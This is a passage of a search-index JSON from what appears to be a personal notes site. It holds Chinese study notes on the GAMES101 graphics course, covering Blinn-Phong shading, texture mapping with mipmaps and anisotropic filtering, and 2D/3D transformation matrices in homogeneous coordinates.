<p>\u5bf9\u4e8e\u6f2b\u53cd\u5c04 Diffuse\uff1a</p> <ul> <li>\u5149\u7ebf\u5747\u5300\u53cd\u5c04\u5728\u6240\u6709\u65b9\u5411<ul> <li>\u5bf9\u4e8e\u4efb\u610f View direction, Surface color \u90fd\u662f\u76f8\u540c\u7684</li> </ul> </li> <li>\u63a5\u53d7\u5230\u7684\u5149\u7ebf\u603b\u91cf\uff1a \\(\\cos \\theta = l\\cdot n\\)<ul> <li>\u7531\u4e8e\u4e00\u822c\u8003\u8651\u5355\u4f4d\u9762\u79ef\uff0c\u6240\u4ee5\u4f7f\u7528 \\(\\cos \\theta\\) \u63cf\u8ff0\u4e5f\u662f\u8db3\u591f\u7684</li> </ul> </li> </ul> <p></p> <p>\u5bf9\u4e8e\u70b9\u5149\u6e90\uff0c\u6211\u4eec\u77e5\u9053\u4efb\u610f\u7403\u9762\u5149\u7ebf\u603b\u80fd\u91cf\u76f8\u540c\uff0c\u90a3\u4e48\u5230\u8fbe\u79bb\u70b9\u5149\u6e90 \\(r\\) \u5904\u67d0\u4e00\u5355\u4f4d\u9762\u79ef\u4e0a\u7684\u5149\u7ebf\u80fd\u91cf\u4e3a\uff1a</p> \\[ E = I/r^2 \\] <p>\u6700\u7ec8\u5f97\u51fa\u6f2b\u53cd\u5c04\u7684\u5149\u7ebf\u4e3a\uff1a</p> \\[ L_d = k_d (I / r^2) \\max (0, n\\cdot l) \\] <p>\u5176\u4e2d \\(k_d\\) \u662f diffuse coefficient(color)\uff0c\u53cd\u5e94\u8be5\u6750\u6599\u5bf9\u4e0d\u540c\u989c\u8272\u5149\u7684\u5438\u6536\u7387\u3002</p> <p></p> <p>\u5bf9\u4e8e\u9ad8\u5149 Specular\uff1a</p> <ul> <li>\u5149\u7ebf\u5f3a\u5ea6\u53d6\u51b3\u4e8e view direction<ul> <li>\u5f53 \\(v\\) \u89d2\u5ea6\u4e0e\u955c\u9762\u53cd\u5c04\u5149\u8def\u7ebf\u63a5\u8fd1\u65f6\uff0c\u80fd\u63a5\u6536\u5230\u5149\u7ebf</li> </ul> </li> </ul> <p>\u5b9a\u4e49\u534a\u7a0b\u5411\u91cf\uff1a</p> \\[ h = bisector(v,l) = \\frac{v+l}{||v+l||} \\] <p></p> <p>\u90a3\u4e48\u9ad8\u5149\u7684\u5149\u7ebf\u4e3a\uff1a</p> \\[ L_s = k_s (I / r^2)\\max (0, n\\cdot h)^p \\] <p>\u5411\u91cf\u4e4b\u95f4\u5939\u89d2\u7684\u4f59\u5f26\u786e\u5b9e\u80fd\u591f\u4f53\u73b0\u89d2\u5ea6\u7684\u63a5\u8fd1\u7a0b\u5ea6\uff0c\u4f46\u662f\u5bf9\u4e8e\u9ad8\u5149\u6765\u8bf4\u5bb9\u5fcd\u5ea6\u8fc7\u9ad8\uff0c\u56e0\u6b64\u9700\u8981\u5728\u89d2\u5ea6\u4e0a\u4f5c \\(p\\) \u6b21\u65b9\u3002</p> <p></p> <p>\u901a\u5e38\uff0cp \u53d6 100 ~ 200</p> <p>\u4e0d\u540c\u7684 \\(k_s\\) \u548c \\(p\\) \u7684\u6548\u679c\u5982\u4e0b\uff1a</p> <p></p> <p>\u5bf9\u4e8e\u73af\u5883\u5149\u7ebf Ambient\uff1a</p> <p>\u5bf9\u67d0\u4e2a\u70b9\u63a5\u6536\u5230\u7684\u73af\u5883\u5149\u7ebf\u8ba1\u7b97\u662f\u6781\u5176\u56f0\u96be\u7684\uff0c\u6211\u4eec\u53ef\u4ee5\u5927\u80c6\u5047\u8bbe\u6765\u81ea\u73af\u5883\u7684\u5149\u5f3a \\(I_a\\) \u662f\u56fa\u5b9a\u7684\uff1a</p> \\[ L_a = K_a I_a \\] <ul> <li>\u73af\u5883\u5149\u548c\u5411\u91cf\u6ca1\u5173\u7cfb\uff0c\u662f\u4e00\u4e2a\u5e38\u6570</li> </ul> <p></p>"},{"location":"Accumulation/Games101/Shading/#shading-frequencies","title":"Shading Frequencies","text":"<p>\u7740\u8272\u9891\u7387\uff0c\u5c31\u662f\u7740\u8272\u8981\u5e94\u7528\u5728\u54ea\u4e9b\u70b9\u4e0a\u3002</p> <ul> <li>Flat shading - shade each triangle<ul> <li>\u5bf9\u6bcf\u4e00\u4e2a\u4e09\u89d2\u5f62\u5e73\u9762\u8fdb\u884c\u7740\u8272</li> <li>\u4e0d\u9002\u5408\u5149\u6ed1\u5e73\u9762</li> </ul> </li> <li>Gouraud shading - shade each vertex<ul> <li>\u5bf9\u6bcf\u4e00\u4e2a\u4e09\u89d2\u5f62\u7684\u9876\u70b9\u8fdb\u884c\u7740\u8272</li> </ul> </li> <li>Phong shading - shade each pixel<ul> <li>\u5bf9\u6bcf\u4e00\u4e2a\u50cf\u7d20\u8fdb\u884c\u7740\u8272</li> </ul> </li> </ul> <p></p> <p>\u53ef\u4ee5\u770b\u5230\uff0c\u5f53\u6211\u4eec\u7684\u51e0\u4f55\u5212\u5206\u7684\u8f83\u7ec6\u65f6\uff0c\u53ef\u4ee5\u4f7f\u7528\u76f8\u5bf9\u7b80\u5355\u7684 Flat shading \u5f97\u5230\u7c7b\u4f3c\u7684\u6548\u679c\u3002</p> <p>\u90a3\u4e48\u6211\u4eec\u5982\u4f55\u5b9a\u4e49\u9010\u9876\u70b9\u7684\u6cd5\u7ebf\u548c\u9010\u50cf\u7d20\u7684\u6cd5\u7ebf\u5462\uff1f</p> <p>\u5bf9\u4e8e\u9876\u70b9\uff0c\u5176\u6cd5\u7ebf\u53ef\u4ee5\u53d6\u5176\u5468\u56f4\u4e09\u89d2\u5f62\u7684\u52a0\u6743\u5e73\u5747\uff1a</p> \\[ N_v = \\frac{\\sum N_i}{|\\sum N_i|}\\] <p></p> <p>\u5bf9\u4e8e\u5e73\u9762\u5185\u7684\u50cf\u7d20\uff0c\u7531\u4e8e\u5df2\u77e5\u5e73\u9762\u9876\u70b9\u7684\u6cd5\u7ebf\uff0c\u53ef\u4ee5\u5229\u7528\u91cd\u5fc3\u5750\u6807\u5f97\u51fa\u5e73\u6ed1\u8fc7\u6e21\u7684\u6cd5\u7ebf</p> <p></p>"},{"location":"Accumulation/Games101/Shading/#graphic-pipeline","title":"Graphic Pipeline","text":"<p>\u5373\u5b9e\u65f6\u6e32\u67d3\u7ba1\u7ebf\uff1a</p> <p></p> <p>\u73b0\u5728\u7684CPU\u5141\u8bb8\u7528\u6237\u81ea\u5df1\u7f16\u7a0b\uff0c\u53bb\u89e3\u51b3\u9876\u70b9\u548c\u50cf\u7d20\u5982\u4f55\u64cd\u4f5c\uff0c\u9700\u8981\u6211\u4eec\u4f7f\u7528\u56fe\u5f62\u5b66API\uff08\u5982 OpenGL\uff09\u81ea\u5df1\u5199\u4e00\u4e2a shader program\u3002</p>"},{"location":"Accumulation/Games101/Shading/#texture-mapper","title":"Texture Mapper","text":"<p>\u4e3a\u4e86\u5728\u4e00\u4e2a\u7269\u4f53\u7684\u4e0d\u540c\u4f4d\u7f6e\u5b9a\u4e49\u4e0d\u540c\u5c5e\u6027\uff0c\u6211\u4eec\u5f15\u5165\u4e86\u7eb9\u7406\u6620\u5c04\u3002</p> <p>\u4efb\u4f55\u7684\u4e09\u7ef4\u8868\u9762\u90fd\u53ef\u4ee5\u5c55\u5f00\u4e3a\u4e8c\u7ef4\u5e73\u9762\uff0c\u8fd9\u4e2a\u4e8c\u7ef4\u5e73\u9762\u5373\u53ef\u79f0\u4e3a\u7eb9\u7406\uff08Texture\uff09\uff1a</p> <p></p> <p></p> <p>\u5c06\u4e09\u89d2\u5f62\u7684\u9876\u70b9\u6620\u5c04\u5230 Texture \u4e0a\u7684\u5750\u6807 \\((u,v)\\in [0,1]^2\\) \uff1a</p> <p></p> <p>\u4e3a\u4e86\u5b9e\u73b0\u63d2\u503c\u7b97\u6cd5\uff0c \u6211\u4eec\u5f15\u5165\u91cd\u5fc3\u5750\u6807\uff08Barycentric Coordinates\uff09\u3002</p> <p>\u4e09\u89d2\u5f62\u5185\u90e8\u7684\u4efb\u610f\u4e00\u70b9\u5750\u6807\uff0c\u90fd\u53ef\u4ee5\u7531\u5176\u9876\u70b9\u5750\u6807\u7684\u7ebf\u6027\u7ec4\u5408\u8868\u793a\uff1a</p> \\[ (x,y)=\\alpha A +\\beta B +\\gamma C,\\ \\ \\alpha +\\beta +\\gamma = 1 \\] <p>\u5982\u679c \\(\\alpha ,\\beta ,\\gamma\\) \u4e2d\u6709\u8d1f\u6570\uff0c\u5219\u8be5\u70b9\u4e0d\u5728\u4e09\u89d2\u5f62\u5185\u90e8</p> <p>\u90a3\u4e48\u91cd\u5fc3\u5750\u6807\u5373 \\((\\alpha ,\\beta ,\\gamma)\\)\u3002\u9664\u6b64\u4e4b\u5916\uff0c\u91cd\u5fc3\u5750\u6807\u8fd8\u53ef\u4ee5\u901a\u8fc7\u9762\u79ef\u5173\u7cfb\u6c42\u5f97\uff1a</p> <p></p> <p>\u5229\u7528\u5411\u91cf\u53c9\u4e58\u7b49\u4e8e\u56f4\u6210\u7684\u9762\u79ef\uff0c\u6211\u4eec\u5c06\u9876\u70b9\u5750\u6807\u5e26\u5165\uff1a</p> <p></p> <p>\u5b8c\u6210\u4e0a\u8ff0\u91cd\u5fc3\u5750\u6807\u7684\u5b9a\u4e49\u540e\uff0c\u6211\u4e48\u5c31\u53ef\u4ee5\u5bf9\u4e09\u89d2\u5f62\u5185\u4efb\u610f\u70b9\u8fdb\u884c\u63d2\u503c\uff1a</p> \\[ V=\\alpha V_A +\\beta V_B +\\gamma V_C \\] <p>\u5176\u4e2d \\(V\\) \u53ef\u4ee5\u662f positions,texture,coordinates,color,normal,depth,material attributes...</p> <p>\u5b9e\u9645\u5e94\u7528\u4e2d\uff0c\u5c06\u4e09\u7ef4\u7a7a\u95f4\u7684\u4e09\u89d2\u5f62\u6295\u5f71\u5230\u4e8c\u7ef4\u65f6\uff0c\u67d0\u4e00\u70b9\u7684\u91cd\u5fc3\u5750\u6807\u5f88\u53ef\u80fd\u6539\u53d8\u3002\u56e0\u6b64\u6211\u4eec\u9ed8\u8ba4\u9009\u53d6\u4e09\u7ef4\u91cd\u5fc3\u5750\u6807\u3002</p> <pre><code>for each rasterized screen sample (x,y):\n    (u,v) = evaluate texture coordinate at (x,y); \n    // \u2191 use barycentric cordinates\n    texcolor = texture.sample(u,v);\n    sample.color = texcolor; \n    // e.g. k_d of diffuse color\n</code></pre> <p>\u5728\u5f88\u591a\u65f6\u5019\uff0c\u7eb9\u7406\u8f83\u5c0f\uff0c\u5e76\u4e0d\u80fd\u548c\u56fe\u50cf\u7684\u5206\u8fa8\u7387\u4e00\u4e00\u5bf9\u5e94\u3002\u8fd9\u65f6\u5019\u5f88\u591a\u5750\u6807\u6620\u5c04\u5230\u7eb9\u7406\u4e2d\u65f6\u5e76\u4e0d\u662f\u6574\u6570\u503c\uff0c\u9700\u8981\u6211\u4eec\u5bf9\u5176\u8fdb\u884c\u989d\u5916\u7684\u7b97\u6cd5\u5f97\u5230\u8be5\u70b9\u5bf9\u5e94\u7684\u7eb9\u7406\u3002</p> <p></p> <p>\u4e0a\u56fe\u4f8b\u5b50\u4e2d\uff0c\u7b2c\u4e00\u5f20\u56fe\u91c7\u7528\u4e86\u6700\u8fd1\u6574\u6570\u503c\u7684\u7b97\u6cd5\uff0c\u76f4\u63a5\u5bf9\u6620\u5c04\u5750\u6807\u8fdb\u884c\u56db\u820d\u4e94\u5165\uff0c\u4e0d\u8fc7\u6548\u679c\u663e\u800c\u6613\u89c1\u4e0d\u662f\u975e\u5e38\u597d\u3002</p> <p>Bilinear \u7b97\u6cd5\u4f7f\u7528\u4e86\u53cc\u7ebf\u6027\u63d2\u503c\u6765\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u3002\u5bf9\u4e8e\u4e00\u4e2a\u6211\u4eec\u9700\u8981\u91c7\u6837\u7684\u70b9\uff08red point\uff09\uff0c\u6211\u4eec\u8003\u8651\u5176\u5468\u56f4\u56db\u4e2a texture sample locations\uff08black points\uff09\u3002\u4f9d\u6b21\u5bf9\u5176\u6a2a\u5750\u6807\u548c\u7ad6\u5750\u6807\u8fdb\u884c\u7ebf\u6027\u63d2\u503c\uff0c\u5f97\u5230\u53c2\u6570 \\(s,t\\)\uff1a</p> <p></p> <p>\u6700\u540e\u53ef\u4ee5\u7efc\u5408\u8003\u8651\u5468\u56f4\u56db\u4e2a texel \u7684\u5c5e\u6027\uff0c\u5f97\u51fa\u6211\u4eec\u9700\u8981\u7684 texel\u3002</p> <p>\u53e6\u4e00\u79cd\u60c5\u51b5\u662f\uff0c\u7eb9\u7406\u975e\u5e38\u5927\uff0c\u6b64\u65f6\u76f8\u673a\u770b\u5411\u8fdc\u5904\u4e00\u4e2a\u5730\u65b9\u7684\u50cf\u7d20\uff0c\u5b83\u4f1a\u6db5\u76d6\u76f8\u5f53\u5927\u7684\u4e00\u90e8\u5206\u7eb9\u7406\uff0c\u6211\u4eec\u4e0d\u80fd\u7b80\u5355\u5224\u65ad\u8be5\u50cf\u7d20\u7a76\u7adf\u9009\u62e9\u4f55\u79cd\u7eb9\u7406\u3002</p> <p></p> <p>\u89e3\u51b3\u65b9\u6cd5\u4e4b\u4e00\u53ef\u4ee5\u548c\u5148\u524d\u53cd\u8d70\u6837\u4e00\u6837\uff0c\u4f7f\u7528 supersampling \u5f97\u5230\u4e00\u4e2a\u5f88\u597d\u7684\u7ed3\u679c\uff0c\u4f46\u662f\u8fd9\u4e2a\u7b97\u6cd5\u7684\u95ee\u9898\u662f\u8d85\u91c7\u6837\u8017\u8d39\u592a\u591a\u65f6\u95f4\u3002</p> <p>\u53e6\u4e00\u4e2a\u601d\u8def\u662f\u4e0d\u91c7\u6837\uff0c\u800c\u662f\u53bb\u83b7\u53d6\u8be5\u50cf\u7d20\u5bf9\u5e94\u7684 texture \u533a\u57df\u7684\u5e73\u5747\u503c\uff0c\u4f8b\u5982 Mipmap \u8303\u56f4\u67e5\u8be2\u7b97\u6cd5\uff0c\u5176\u7279\u70b9\u662f\uff1a</p> <ul> <li>Fast \u5feb</li> <li>Approximate \u8fd1\u4f3c\u4f30\u8ba1\u503c</li> <li>Square \u53ea\u80fd\u7528\u4e8e\u6b63\u65b9\u5f62</li> </ul> <p>\u5728\u62ff\u5230\u7eb9\u7406\u4e4b\u524d\uff0c\u6211\u4eec\u5148\u5bf9\u7eb9\u7406\u8fdb\u884c\u9884\u5904\u7406\uff0c\u5f97\u5230\u4e0d\u540c\u5c42\u6570\u7684\u7eb9\u7406\u56fe\u6848\uff1a</p> <p></p> <p>\u5b58\u50a8\u7eb9\u7406\u6240\u9700\u7684\u989d\u5916\u7a7a\u95f4\u4e3a \\(1/3\\) \uff0c\u51e0\u4e4e\u4e0d\u589e\u52a0\u6027\u80fd\u8d1f\u62c5\u3002</p> <p>\u8fd9\u4e5f\u662fMipmap\u88ab\u79f0\u4e3a\u56fe\u50cf\u91d1\u5b57\u5854\u7684\u539f\u56e0</p> <p>\u4f8b\u5982\uff0c\u8981\u5bf9\u8fdc\u5904 \\(8\\times 8\\) \u7684\u50cf\u7d20\u96c6\u5408\u6620\u5c04\u4e0a\u56fe\u7eb9\u7406\uff0c\u90a3\u4e48\u6bcf\u9897\u50cf\u7d20\u90fd\u8981\u6620\u5c04\u7684 texel \u4e3a \\(16\\times 16\\) \uff0c\u5373 Level 3\u3002\u6b64\u65f6\u518d\u5bf9\u6bcf\u4e2a\u50cf\u7d20\u7684\u6620\u5c04\u503c\u8fdb\u884c\u53cc\u7ebf\u6027\u63d2\u503c\uff0c\u4ece\u800c\u5f97\u5230\u9ad8\u8d28\u91cf\u7684\u56fe\u50cf\u3002</p> <p>\u9047\u5230\u8981\u4f7f\u7528 Level 1.8 ???</p> <p>\u5bf9\u4e24\u5c42\u90fd\u8fdb\u884c\u53cc\u7ebf\u6027\u63d2\u503c\uff0c\u7136\u540e\u4f7f\u7528\u7ebf\u6027\u63d2\u503c\u5f97\u5230\u7ed3\u679c\u3002</p> <p></p> <p>\u8fd8\u6709\u53e6\u4e00\u79cd\u6bd4 Mipmap \u6548\u679c\u66f4\u597d\u7684\u7b97\u6cd5\uff0c\u53eb\u5404\u5411\u5f02\u6027\u8fc7\u6ee4\uff08Anisotropic Filtering\uff09\uff0c\u5176\u5dee\u522b\u5728\u4e8e\u7ed9\u51fa\u7684\u591a\u5c42\u7eb9\u7406\u5e76\u4e0d\u662f\u6bcf\u5c42\u90fd\u51cf\u5c0f\u4e00\u534a\uff0c\u800c\u662f\u5206\u522b\u51cf\u5c11\u957f\u5bbd\u4e00\u534a\uff1a</p> <p></p> <p>\u5728\u6211\u4eec\u770b\u5411\u5e73\u9762\u65f6\uff0c\u4e00\u4e2a\u50cf\u7d20\u5bf9\u5e94\u7684\u7eb9\u7406\u533a\u57df\u5f88\u6709\u53ef\u80fd\u5bf9\u5e94\u7740\u4e0d\u89c4\u5f8b\u7684\u5f62\u72b6\uff1a</p> <p></p> <p>\u800c\u5404\u5411\u5f02\u6027\u8fc7\u6ee4\u5141\u8bb8\u6211\u4eec\u5bf9\u6a2a\u7ad6\u65b9\u5411\u4e0a\u957f\u6761\u5f62\u533a\u57df\u4f5c\u5feb\u901f\u7684\u8303\u56f4\u67e5\u8be2\uff0c\u80fd\u591f\u89e3\u51b3\u4e00\u90e8\u5206 Mipmap \u89e3\u51b3\u4e0d\u4e86\u7684\u95ee\u9898\u3002</p> <p>Appendix</p> <p>\u8fd8\u6709\u73af\u5883\u8d34\u56fe\u3001\u51f9\u51f8\u8d34\u56fe(Assignment3\u7684Bump)\u3001\u4f4d\u79fb\u8d34\u56fe(Assignment3\u7684Displacement)\u7b49</p>"},{"location":"Accumulation/Games101/Transformation/","title":"Transformation","text":""},{"location":"Accumulation/Games101/Transformation/#transformation","title":"Transformation","text":"<p> \u7ea6 1900 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 10 \u5206\u949f</p> <p>Graphics' Dependencies</p> <ul> <li>Basic Mathematics<ul> <li>Linear algebra, calculus, statistics(\u7edf\u8ba1\u5b66)</li> </ul> </li> <li>Basic Physics<ul> <li>Optics, Mechanics</li> </ul> </li> <li>Misc<ul> <li>Signal Processing \u4fe1\u53f7\u5904\u7406</li> <li>Numerical analysis \u6570\u503c\u5206\u6790</li> </ul> </li> <li>A bit of aesthetics</li> </ul> <p>\u56fe\u5f62\u5b66\u4e2d\uff0c\u7ed9\u51fa\u4e00\u4e2a\u5411\u91cf\uff0c\u9ed8\u8ba4\u662f\u5217\u5411\u91cf\u3002</p>"},{"location":"Accumulation/Games101/Transformation/#2d-transformations","title":"2D Transformations","text":""},{"location":"Accumulation/Games101/Transformation/#scale","title":"Scale \u7f29\u653e","text":"<p>\u5c06\u5411\u91cf x \u8f74\u65b9\u5411\u7f29\u653e \\(s_x\\) \u500d\uff0cy \u8f74\u65b9\u5411\u7f29\u653e \\(s_y\\) \u500d\uff1a</p> \\[ \\left[\\begin{matrix} x' \\\\ y' \\end{matrix} \\right] =\\left[\\begin{matrix}s_x &amp; 0\\\\ 0 &amp; s_y\\end{matrix}\\right] \\left[\\begin{matrix} x \\\\ y \\end{matrix} \\right]  = \\left[\\begin{matrix} s_xx \\\\ s_yy \\end{matrix} \\right]  \\]"},{"location":"Accumulation/Games101/Transformation/#shear","title":"Shear \u5207\u53d8","text":"<p>\u7ad6\u76f4\u65b9\u5411\u4f4d\u79fb\u4e3a 0\uff0c\u6c34\u5e73\u65b9\u5411\u4f4d\u79fb\u4e0e y \u5750\u6807\u5448 \\(ay\\) \u5173\u7cfb\uff1a</p> \\[ \\left[\\begin{matrix} x' \\\\ y' \\end{matrix} \\right] =\\left[\\begin{matrix}1 &amp; a\\\\ 0 &amp; 1\\end{matrix}\\right] \\left[\\begin{matrix} x \\\\ y \\end{matrix} \\right]  = \\left[\\begin{matrix} x+ay \\\\ y \\end{matrix} \\right] \\]"},{"location":"Accumulation/Games101/Transformation/#rotate","title":"Rotate \u65cb\u8f6c","text":"\\[ \\left[\\begin{matrix} x' \\\\ y' \\end{matrix} \\right] =\\left[\\begin{matrix}\\cos \\theta &amp; -\\sin \\theta\\\\ \\sin \\theta &amp; \\cos \\theta \\end{matrix}\\right] \\left[\\begin{matrix} x \\\\ y \\end{matrix} \\right]  = \\left[\\begin{matrix} x\\cos \\theta -y\\sin \\theta \\\\ x\\sin \\theta +y\\cos \\theta \\end{matrix} \\right] \\]"},{"location":"Accumulation/Games101/Transformation/#inverse","title":"Inverse \u9006\u53d8\u6362","text":"<p>\u65cb\u8f6c\u77e9\u9635\u7684\u9006\u7b49\u4e8e\u65cb\u8f6c\u77e9\u9635\u7684\u8f6c\u7f6e\uff0c\u5373\u6b63\u4ea4\u77e9\u9635</p> \\[\\begin{array}c R_\\theta = \\left[\\begin{matrix}\\cos \\theta &amp; -\\sin \\theta\\\\ \\sin \\theta &amp; \\cos \\theta \\end{matrix}\\right] \\\\ R_{-\\theta} = \\left[\\begin{matrix}\\cos \\theta &amp; \\sin \\theta\\\\ -\\sin \\theta &amp; \\cos \\theta \\end{matrix}\\right] = R_\\theta^T \\\\  \\text{By Definition:  } R_\\theta^{-1} = R_{-\\theta} = R_\\theta ^T\\end{array}\\]"},{"location":"Accumulation/Games101/Transformation/#homogeneous-coordinates","title":"Homogeneous coordinates","text":""},{"location":"Accumulation/Games101/Transformation/#translation","title":"Translation \u5e73\u79fb","text":"<p>\u5bf9\u4e8e\u5e73\u79fb\u64cd\u4f5c\uff0c\u6211\u4eec\u4e0d\u80fd\u7b80\u5355\u4f7f\u7528\u77e9\u9635\u4e58\u6cd5\u8868\u793a\u8be5\u53d8\u6362\uff0c\u8fd9\u4e5f\u662f\u4e3a\u4ec0\u4e48\u6211\u4eec\u9700\u8981\u5f15\u5165\u9f50\u6b21\u5750\u6807\u53d8\u6362\u3002</p> <p></p> \\[ \\left[\\begin{matrix} x' \\\\ y' \\end{matrix} \\right] =\\left[\\begin{matrix}a &amp; b\\\\ c &amp; d \\end{matrix}\\right] \\left[\\begin{matrix} x \\\\ y \\end{matrix} \\right] + \\left[\\begin{matrix} t_x \\\\ t_y\\end{matrix} \\right] \\] <p>\u9f50\u6b21\u5750\u6807\u901a\u8fc7\u589e\u52a0\u4e00\u7ef4\u5750\u6807\u6765\u8868\u793a\u5e73\u79fb\u53d8\u6362\u3002</p> <ul> <li>2D point \uff1a\\((x,y,1)^T\\)</li> <li>2D vector\uff1a\\((x,y,0)^T\\)</li> </ul> <p>\u5728\u9f50\u6b21\u5750\u6807\u7cfb\u4e2d\uff0c\\((x,y,\\omega)^T\\) \u8868\u793a\u4e00\u4e2a 2D point \\((\\frac{x}{\\omega}, \\frac{y}{\\omega},1)^T\\) \uff0c\u5176\u4e2d \\(\\omega \\ne 0\\)</p> <p>\u6b63\u786e\u6027</p> <ul> <li>vector + vector = vector</li> <li>point  -  point = vector</li> <li>point  - vector = point</li> </ul> <p>\u90a3\u4e48\u5e73\u79fb\u53ef\u8868\u793a\u4e3a\uff1a</p> \\[ \\left[\\begin{matrix} x' \\\\ y'  \\\\\\omega'\\end{matrix} \\right] =\\left[\\begin{matrix}1 &amp; 0&amp; t_x \\\\ 0 &amp; 1 &amp; t_y  \\\\ 0 &amp; 0 &amp; 1\\end{matrix}\\right] \\left[\\begin{matrix} x \\\\ y \\\\ 1 \\end{matrix} \\right]  = \\left[\\begin{matrix} x+t_x \\\\ y+t_y \\\\ 1\\end{matrix} \\right] \\]"},{"location":"Accumulation/Games101/Transformation/#affine-transformations","title":"Affine Transformations \u4eff\u5c04\u53d8\u6362","text":"<p>\u91cd\u65b0\u770b\u5f85\u4e0b\u5217\u4e8c\u7ef4\u53d8\u6362+\u5e73\u79fb\uff1a</p> \\[ \\left[\\begin{matrix} x' \\\\ y' \\end{matrix} \\right] =\\left[\\begin{matrix}a &amp; b\\\\ c &amp; d \\end{matrix}\\right] \\left[\\begin{matrix} x \\\\ y \\end{matrix} \\right] + \\left[\\begin{matrix} t_x \\\\ t_y\\end{matrix} \\right] \\] <p>\u5728\u9f50\u6b21\u5750\u6807\u4e0b\uff0c\u4e0a\u5f0f\u8868\u793a\u4e3a\uff1a</p> \\[ \\left[\\begin{matrix} x' \\\\ y'  \\\\\\omega'\\end{matrix} \\right] =\\left[\\begin{matrix}a &amp; b&amp; t_x \\\\ c &amp; d &amp; t_y  \\\\ 0 &amp; 0 &amp; 1\\end{matrix}\\right] \\left[\\begin{matrix} x \\\\ y \\\\ 1 \\end{matrix} \\right]  \\] <p>\u5148\u7ebf\u6027\u53d8\u6362\uff0c\u518d\u5e73\u79fb\uff01\uff01\uff01</p> <p>\u76f8\u5e94\u7684\uff0c\u7528\u9f50\u6b21\u5750\u6807\u5206\u522b\u8868\u793a\u7f29\u653e\u3001\u65cb\u8f6c\u7684\u77e9\u9635\uff1a</p> <p>Scale\uff1a</p> \\[ S(s_x, s_y)=\\left[\\begin{matrix}s_x &amp; 0 &amp; 0 \\\\ 0 &amp; s_y &amp; 0 \\\\ 0 &amp; 0 &amp; 1\\end{matrix}\\right] \\] <p>Rotate\uff1a</p> \\[ R(\\alpha) = \\left[\\begin{matrix}\\cos \\alpha &amp; -\\sin \\alpha &amp; 0 \\\\ \\sin \\alpha &amp; \\cos \\alpha &amp; 0 \\\\ 0 &amp; 0 &amp; 1\\end{matrix}\\right] \\] <p>Translation\uff1a</p> \\[ T(t_x, t_y) =\\left[\\begin{matrix}1 &amp; 0&amp; t_x \\\\ 0 &amp; 1 &amp; t_y  \\\\ 0 &amp; 0 &amp; 1\\end{matrix}\\right] \\]"},{"location":"Accumulation/Games101/Transformation/#composing-transforms","title":"Composing Transforms","text":"<p>\u77e9\u9635\u4e58\u6cd5\u4e0d\u6ee1\u8db3\u4ea4\u6362\u5f8b</p> <p></p> <p>\u6709\u65f6\u5019\u65cb\u8f6c\u64cd\u4f5c\u5f88\u96be\u628a\u63e1\uff0c\u53ef\u4ee5\u5148\u628a\u70b9\u79fb\u52a8\u56de\u539f\u70b9\uff0c\u8fdb\u884c\u65cb\u8f6c\u540e\u518d\u79fb\u52a8\u56de\u53bb\uff1a</p> <p></p>"},{"location":"Accumulation/Games101/Transformation/#3d-transformations","title":"3D Transformations","text":"<p>Use homogeneous coordinates again:</p> <ul> <li>3D point  = \\((x,y,z,1)^T\\)</li> <li>3D vector = \\((x,y,z,0)^T\\)</li> </ul> <p>\u540c\u6837\uff0c\u5728 \\(\\omega \\ne 0\\) \u7684\u60c5\u51b5\u4e0b\uff0c\\((x,y,z,\\omega)^T\\) \u8868\u793a\u4e00\u4e2a\u4e09\u7ef4\u70b9 \\((\\frac{x}{\\omega},\\frac{y}{\\omega},\\frac{z}{\\omega},1)^T\\) </p> <p>\u90a3\u4e48\uff0c\u4e09\u7ef4\u7a7a\u95f4\u7684\u4eff\u5c04\u53d8\u6362\u5982\u4e0b\uff1a</p> \\[ \\left[\\begin{matrix}x' \\\\ y'  \\\\ z' \\\\ 1\\end{matrix}\\right] = \\left[\\begin{matrix}a &amp; b&amp; c &amp; t_x \\\\ d &amp; e &amp; f &amp; t_y  \\\\ g &amp; h &amp; i &amp; t_x \\\\ 0 &amp; 0 &amp; 0 &amp; 1\\end{matrix}\\right] = \\left[\\begin{matrix}x \\\\ y \\\\ z \\\\ 1\\end{matrix}\\right]  \\] <p>Scale\uff1a</p> \\[ S(s_x, s_y, s_z)=\\left[\\begin{matrix}s_x &amp; 0 &amp; 0 &amp; 0\\\\ 0 &amp; s_y &amp; 0  &amp; 0\\\\ 0 &amp; 0 &amp; s_z &amp; 0 \\\\ 0 &amp; 0 &amp; 0 &amp; 1\\end{matrix}\\right] \\] <p>Translation\uff1a</p> \\[ T(t_x, t_y, t_z) =\\left[\\begin{matrix}1 &amp; 0 &amp; 0 &amp; t_x \\\\ 0 &amp; 1 &amp; 0 &amp; t_y  \\\\ 0 &amp; 0 &amp; 1 &amp; t_z \\\\ 0 &amp; 0 &amp; 0 &amp; 1\\end{matrix}\\right] \\] <p>Rotate\uff1a</p> \\[\\begin{array}c R_x(\\alpha) = \\left[\\begin{matrix}1 &amp; 0 &amp; 0 &amp; 0\\\\0 &amp; \\cos \\alpha &amp; -\\sin \\alpha &amp; 0 \\\\ 0 &amp; \\sin \\alpha &amp; \\cos \\alpha &amp; 0 \\\\ 0 &amp; 0 &amp; 0 &amp; 1\\end{matrix}\\right] \\\\ R_y(\\alpha) = \\left[\\begin{matrix}\\cos \\alpha &amp; 0 &amp; \\sin \\alpha &amp; 0\\\\0 &amp; 1 &amp; 0 &amp; 0 \\\\ -\\sin \\alpha &amp; 0 &amp; \\cos \\alpha &amp; 0 \\\\ 0 &amp; 0 &amp; 0 &amp; 1\\end{matrix}\\right] \\\\ R_z(\\alpha) = \\left[\\begin{matrix}\\cos \\alpha &amp; -\\sin \\alpha &amp; 0 &amp; 0\\\\ \\sin \\alpha &amp; \\cos \\alpha &amp; 0 &amp; 0\\\\0 &amp; 0 &amp; 1 &amp; 0 \\\\0 &amp; 0 &amp; 0 &amp; 1\\end{matrix}\\right] \\end{array}\\] <p>\u9700\u8981\u6ce8\u610f\u7ed5y\u8f74\u7684\u65cb\u8f6c\u77e9\u9635 \\(\\sin\\) \u7684\u6b63\u8d1f\u6027\u4e0d\u4e00\u6837</p> <p>\u4efb\u610f\u4e09\u7ef4\u65cb\u8f6c\u53ef\u8868\u793a\u4e3a\u7ec4\u5408\u77e9\u9635\uff1a</p> \\[ R_{xyz}(\\alpha, \\beta, \\gamma) = R_x(\\alpha) R_y(\\beta) R_z(\\gamma) \\] <p>\u53e6\u6709 Rodrigues' Rotate 